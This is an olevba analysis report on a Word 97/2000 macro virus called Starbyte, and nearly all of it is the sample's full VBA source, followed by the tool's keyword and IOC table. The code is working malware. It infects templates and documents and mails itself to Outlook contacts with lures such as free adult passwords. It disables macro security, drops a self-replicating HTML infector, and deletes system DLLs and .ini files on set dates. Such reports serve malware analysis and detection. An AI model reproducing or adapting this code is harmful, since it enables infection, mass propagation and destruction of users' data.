olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Evolution.b
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Evolution.b 
in file: Virus.MSWord.Evolution.b - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public BootCk1 As String
Public BootCk2 As String
Public BootCk3 As String
Public Bootup As Boolean
Public ByeMacro As String
Public Hostinf As Boolean
Public FileInf As Boolean
Public FExport As String
Public Ex_Yes As Boolean
Public Filename As String
Public FileID As String
Public Virname As String
Public FC_There As Boolean
Public FO_There As Boolean
Public FP_There As Boolean
Public FN_There As Boolean
Public FS_There As Boolean
Public FSA_There As Boolean
Public VrusName As String
Public Armor As Boolean
Function Boot_Inf()
  On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
 BootCk1 = Dir(Application.StartupPath + "\Wordinit.dot")
 BootCk2 = Dir(Application.StartupPath + "\WordTemp.dot")
 BootCk3 = Dir(Application.StartupPath + "\Add-in.dot")
 If BootCk1 = "Wordinit.dot" Then Bootup = True
 If BootCk2 = "WordTemp.dot" Then Bootup = True
 If BootCk3 = "Add-in.dot" Then Bootup = True
 If Bootup = True Then GoTo checkmy
If ActiveDocument.Saved = True Then
 Randomize Timer
V = Int(Rnd(1) * 3) + 1
    If V = 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Windows\System"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Windows\System"
    End If
    If V = 2 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Windows\Command"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Windows\Command"
    End If
    If V = 3 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Program Files"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Program Files"
   r = Int(Rnd(1) * 3) + 1
 If r = 1 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\Wordinit.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
 If r = 2 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\WordTemp.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
  If r = 3 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\Add-in.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
    End If
checkmy:
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
Application.ScreenUpdating = False
    Call ID_check
If Hostinf = False Then
With NormalTemplate.VBProject
            With .VBComponents.Import(FileID)
            End With
            End With
NormalTemplate.Save
End If
If FileInf = False Then
With ActiveDocument.VBProject
    With .VBComponents.Import(FileID)
    End With
End With
End If
End If
Application.ScreenUpdating = True
End Function
 Function Worm()
 ' For Outlook
  On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
 Dim Z
Randomize Timer
Z = Int(Rnd(1) * 3) + 1
If Z = 1 Then Call Cancer
If Z = 2 Then Call Adult
If Z = 3 Then Call Jokes
End Function
Function Cancer()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") <> "by Lucky2000" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
X = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(X)
Spawnme.Recipients.add Peep
X = X + 1
If X > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Can I help you ???"
Spawnme.Body = "Ok...I help you...To make our PC are Infected by STARBYTE !!!"
Spawnme.Attachments.add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") = "Lucky2000"
End If
 End Function
Function Adult()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") <> "Lucky2000" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
X = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(X)
Spawnme.Recipients.add Peep
X = X + 1
If X > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Free Adult Site Passwords!!"
Spawnme.Body = "Free inside attached Document are over 50 Adult Verify Passwords!!  Use for your deepest desires!! Adults Only Please..."
Spawnme.Attachments.add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") = "Lucky2000"
End If
End Function
Function Jokes()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") <> "Lucky2000" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
X = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(X)
Spawnme.Recipients.add Peep
X = X + 1
If X > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Congratulation"
Spawnme.Body = "Congratulation you WON a very funny Price !!  "
Spawnme.Attachments.add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") = "Lucky2000"
End If
End Function
Function ID_check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Do
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
newname:
Close #1
Open "C:\windows\system\FixDvr.cpl" For Append As #1
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
        End If
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
lost:
Next Z
Loop Until EOF(1)
Close #1
Dim Lib
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
skip:
Next Lib
Loop Until EOF(1)
Hostinf = False
doccheck:
Close #1
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
nope:
Next Lib
Loop Until EOF(1)
FileInf = False
leave:
Close #1
End Function
Function Status_Of_Armor()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
Offense:
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
End Function
Function Code_Transportation()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\Exchange.cpl")
If FExport = "Exchange.cpl" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph_ME Else GoTo Recognize
Morph_ME:
Randomize Timer
q = Int(Rnd(1) * 5) + 1
For vi = 1 To q
X = Int(Rnd(1) * 26)
If X = 1 Then a$ = "A"
If X = 2 Then a$ = "B"
If X = 3 Then a$ = "C"
If X = 4 Then a$ = "D"
If X = 5 Then a$ = "E"
If X = 6 Then a$ = "F"
If X = 7 Then a$ = "G"
If X = 8 Then a$ = "H"
If X = 9 Then a$ = "I"
If X = 10 Then a$ = "J"
If X = 11 Then a$ = "K"
If X = 12 Then a$ = "L"
If X = 13 Then a$ = "M"
If X = 14 Then a$ = "N"
If X = 15 Then a$ = "O"
If X = 16 Then a$ = "P"
If X = 17 Then a$ = "Q"
If X = 18 Then a$ = "R"
If X = 19 Then a$ = "S"
If X = 20 Then a$ = "T"
If X = 21 Then a$ = "U"
If X = 22 Then a$ = "V"
If X = 23 Then a$ = "W"
If X = 24 Then a$ = "X"
If X = 25 Then a$ = "Y"
If X = 26 Then a$ = "Z"
Filename = Filename + a$
Next vi
X = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & X & ".cpl"
Open "C:\windows\system\Exchange.cpl" For Append As #1
Print #1, FileID
Close #1
For X = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(X).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(X).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\FixDvr.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(X).Name
Close #1
nex:
Next X
Do
On Error Resume Next
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
nextt:
Exit Function
Recognize:
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
Do
On Error Resume Next
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
tryharder:
End Function
Function Morph_check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open FileID For Input As #1
Dim FC_Check
Do
    Line Input #1, FC_Check
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
Dim FO_Check
Do
    Line Input #1, FO_Check
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
Dim FP_Check
Do
    Line Input #1, FP_Check
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
Loop Until EOF(1)
FN_Look:
Dim FN_Check
Do
    Line Input #1, FN_Check
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
Loop Until EOF(1)
FS_Look:
Dim FS_Check
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
Loop Until EOF(1)
FSA_Look:
Dim FSA_Check
Do
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
Loop Until EOF(1)
End Function
Function Uprising()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
Randomize Timer
PM = Int(Rnd(1) * 75) + 1
If PM = 22 Then
If FC_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileClose()"
Print #1, "On error resume next"
Print #1, "Call Starbyte"
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
End If
If PM = 73 Then
If FO_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call Starbyte"
Print #1, "end sub"
Close #1
End If
If PM = 69 Then
If FP_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FilePrint()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFilePrint)"
Print #1, "Call Starbyte"
Print #1, "End sub"
Close #1
End If
If PM = 22 Then
If FN_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileNew()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call Starbyte"
Print #1, "End Sub"
Close #1
End If
If PM = 9 Then
If FS_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileSave()"
Print #1, "on error resume next"
Print #1, "call Starbyte"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
If PM = 18 Then
If FSA_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileSaveAs()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileSaveAs)"
Print #1, "Call Starbyte"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
End Function
Function NfctNormal()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
            If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
        Open "C:\windows\system\FixDvr.cpl" For Append As #1
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
nexus:
    Next l
With NormalTemplate.VBProject.VBComponents.Import(FileID)
End With
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte", "Lucky2000") = "1" Then Exit Function
Assistant.Visible = True
    With Assistant.NewBalloon
            .Icon = msoIconAlert
            .text = "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists please contact Microsoft Technical Support."
            .Heading = "Microsoft Word"
            .Animation = msoAnimationGetTechy
            .Show
        End With
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte", "Lucky2000") = "1"
End Function
Function NfctFile()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
VrusName = ""
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
With ActiveDocument.VBProject.VBComponents.Import(FileID)
End With
Randomize Timer
q = Int(Rnd(1) * 10) + 2
For vi = 1 To q
X = Int(Rnd(1) * 26)
If X = 1 Then a$ = "A"
If X = 2 Then a$ = "B"
If X = 3 Then a$ = "C"
If X = 4 Then a$ = "D"
If X = 5 Then a$ = "E"
If X = 6 Then a$ = "F"
If X = 7 Then a$ = "G"
If X = 8 Then a$ = "H"
If X = 9 Then a$ = "I"
If X = 10 Then a$ = "J"
If X = 11 Then a$ = "K"
If X = 12 Then a$ = "L"
If X = 13 Then a$ = "M"
If X = 14 Then a$ = "N"
If X = 15 Then a$ = "O"
If X = 16 Then a$ = "P"
If X = 17 Then a$ = "Q"
If X = 18 Then a$ = "R"
If X = 19 Then a$ = "S"
If X = 20 Then a$ = "T"
If X = 21 Then a$ = "U"
If X = 22 Then a$ = "V"
If X = 23 Then a$ = "W"
If X = 24 Then a$ = "X"
If X = 25 Then a$ = "Y"
If X = 26 Then a$ = "Z"
VrusName = VrusName + a$
Next vi
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Do
Line Input #1, Virname
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
Loop Until EOF(1)
Close #1
For X = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(X).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(X).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\FixDvr.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(X).Name
Close #1
nex:
Next X
End Function
Function Starbyte()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Code_Transportation
Call ID_check
Call Status_Of_Armor
If Hostinf = False Then Call NfctNormal
If FileInf = False Then Call NfctFile
Call Morph_check
Call Uprising
Call Payload
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
End Function
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Revolution
WordBasic.filesave
Call Boot_Inf
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Status_Of_Armor
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
Call Boot_Inf
End Sub
Sub AutoExit()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Starbyte
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte", "Germany") = "1" Then GoTo ZineS
Open "C:\windows\system\Exchange.cpl" For Input As #2
Line Input #2, FileID
Close #2
Open FileID For Append As #9
Print #9, "' EOF"
Close #9
Open FileID For Input As #3
Randomize Timer
W = Int(Rnd(1) * 5) + 1
For vir = 1 To W
X = Int(Rnd(1) * 26)
If X = 1 Then a$ = "A"
If X = 2 Then a$ = "B"
If X = 3 Then a$ = "C"
If X = 4 Then a$ = "D"
If X = 5 Then a$ = "E"
If X = 6 Then a$ = "F"
If X = 7 Then a$ = "G"
If X = 8 Then a$ = "H"
If X = 9 Then a$ = "I"
If X = 10 Then a$ = "J"
If X = 11 Then a$ = "K"
If X = 12 Then a$ = "L"
If X = 13 Then a$ = "M"
If X = 14 Then a$ = "N"
If X = 15 Then a$ = "O"
If X = 16 Then a$ = "P"
If X = 17 Then a$ = "Q"
If X = 18 Then a$ = "R"
If X = 19 Then a$ = "S"
If X = 20 Then a$ = "T"
If X = 21 Then a$ = "U"
If X = 22 Then a$ = "V"
If X = 23 Then a$ = "W"
If X = 24 Then a$ = "X"
If X = 25 Then a$ = "Y"
If X = 26 Then a$ = "Z"
Filename = Filename + a$
Next vir
F = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & F & ".cpl"
Open FileID For Append As #4
Do
Line Input #3, stuff
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 7) + 1
        If t = 1 Then Z$ = " '" & Application.UserAddress
        If t = 2 Then Z$ = " '" & Application.UserName
        If t = 3 Then Z$ = " '" & Time$
        If t = 4 Then Z$ = " '" & Application.UserInitials
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
Print #4, Z$
        Loop Until stuff = "' EOF"
Close #3
Close #4
Kill "C:\windows\system\Exchange.cpl"
Open "C:\windows\system\Exchange.cpl" For Append As #5
Print #5, FileID
Close #5
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte", "Germany") = "1"
ZineS:
End Sub
Sub AutoNew()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Starbyte
End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Starbyte
Call Worm
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Function Payload()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
If System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\Hax\Starbyte", "HTP-Error") = "Lucky2000" Then Exit Function
If Day(Now) = 26 Then GoTo NukeDLL
If Day(Now) = 5 Then GoTo Format_Me
Randomize Timer
X = Int(Rnd(1) * 40) + 1
If X = 10 Then
Open "C:\windows\Control.ini" For Append As #1
Seek #1, 0
Print #1, "[Lucky2000's Contest]"
Print #1, "DemoType = 0"
Print #1, "RotStyle = 3"
Print #1, "Tesselation = 100"
Print #1, "Size = 100"
Print #1, "Speed = 75"
Print #1, "SurfStyle = 0"
Print #1, "Font = Comic Sans MS"
Print #1, "FontAttributes = 0"
Print #1, "Charset = 0"
Print #1, "Text = Starbyte a very Funny Virus !!!"
Print #1, "Texture = None"
Print #1, "TextureFileOffset = 3"
Close #1
End If
If X = 20 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main", "Start Page") = "C:\Windows\System\Default1.html"
Open "C:\windows\system\Default1.html" For Output As #1
Print #1, "<html><!--HTML/Lucky .a-->"
Print #1, "<body>"
Print #1, "<SCRIPT language=vbscript>"
Print #1, "Sub Window_OnLoad()"
Print #1, "Call Infection"
Print #1, "End Sub"
Print #1, "Sub Infection()"
Print #1, "Set FLSysObj = CreateObject" & Chr(40) & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & Chr(41)
Print #1, "Set wordobj = CreateObject" & Chr(40) & Chr(34) & "Word.application" & Chr(34) & Chr(41)
Print #1, "Set FLSrch = wordobj.Application.FileSearch"
Print #1, "FLSrch.NewSearch"
Print #1, "FLSrch.LookIn = " & Chr(34) & "C:\" & Chr(34)
Print #1, "FLSrch.SearchSubFolders = True"
Print #1, "FLSrch.FileName = " & Chr(34) & "*.htm*" & Chr(34)
Print #1, "FLSrch.Execute"
Print #1, "For t = 1 To FLSrch.FoundFiles.Count"
Print #1, "Set InFX = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
Print #1, "f = InFX.readline"
Print #1, "InFX.Close"
Print #1, "If f <> " & Chr(34) & "<html><!--HTML/Lucky .a-->" & Chr(34) & " Then"
Print #1, "Set TxtRng = Document.body.createTextRange"
Print #1, "Set Lucky = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
Print #1, "Contents = Lucky.readall"
Print #1, "Lucky.Close"
Print #1, "Set Kry = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 2, True)"
Print #1, "Kry.writeline " & Chr(34) & "<html><!--HTML/Lucky .a-->" & Chr(34)
Print #1, "Kry.writeline " & Chr(34) & "<body>" & Chr(34)
Print #1, "Kry.writeline TxtRng.HTMLText"
Print #1, "Kry.writeline " & Chr(34) & "</body>" & Chr(34)
Print #1, "Kry.writeline " & Chr(34) & "</html>" & Chr(34)
Print #1, "Kry.writeline Contents"
Print #1, "Kry.Close"
Print #1, "End If"
Print #1, "Next"
Print #1, "wordobj.Quit"
Print #1, "End Sub"
Print #1, "</SCRIPT>"
Print #1, "</body>"
Print #1, "</html>"
Close #1
End If
If X = 30 Then
Open "C:\autoexec.bat" For Append As #1
Print #1, "@echo This a file from Lucky2000 !!!"
Close #1
End If
If X = 40 Then
On Error Resume Next
Kill "C:\windows\logos.sys"
Kill "C:\windows\system\*.scr"
End If
Exit Function
Format_Me:
Kill "C:\windows\*.ini"
Exit Function
NukeDLL:
Kill "C:\windows\system\*.dll"
Exit Function
End Function
' Polymorphic/Stealth/Destructive Word 97/2000/SR-1 Compatibler Macro Virus/Worm
' Self-Replicating HTML Virus HTML/Lucky .a
' By Lucky2000 the next Generation
' EOF
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Exchange.cpl        |Executable file name                         |
|IOC       |FixDvr.cpl          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

